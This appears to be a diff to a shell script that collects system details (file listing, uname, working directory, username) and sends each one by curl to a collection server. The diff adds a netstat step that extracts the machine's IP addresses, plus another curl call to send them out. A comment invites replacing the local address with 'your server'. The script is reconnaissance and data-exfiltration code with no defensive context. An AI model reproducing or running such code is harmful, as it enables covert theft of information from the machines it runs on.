@@ -3,7 +3,10 @@ OUTPUT1=$(ls | paste -sd ":")
 OUTPUT2=$(uname -a |sed 's/ //g')
 OUTPUT3=$(pwd)
 OUTPUT4=$(whoami)
+OUTPUT5=$(netstat -n -t | awk '{print $4}' | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" |\
+grep -v "127.0.0.1" | sort -u)
 var1= $(curl http://127.0.0.1:8000/resultr/?urls=$OUTPUT1) //here you can use your server
 var2= $(curl http://127.0.0.1:8000/resultr/?urls=$OUTPUT2)
 var3= $(curl http://127.0.0.1:8000/resultr/?urls=$OUTPUT3)
 var4= $(curl http://127.0.0.1:8000/resultr/?urls=$OUTPUT4)
+var5= $(curl http://127.0.0.1:8000/resultr/?urls=$OUTPUT5)
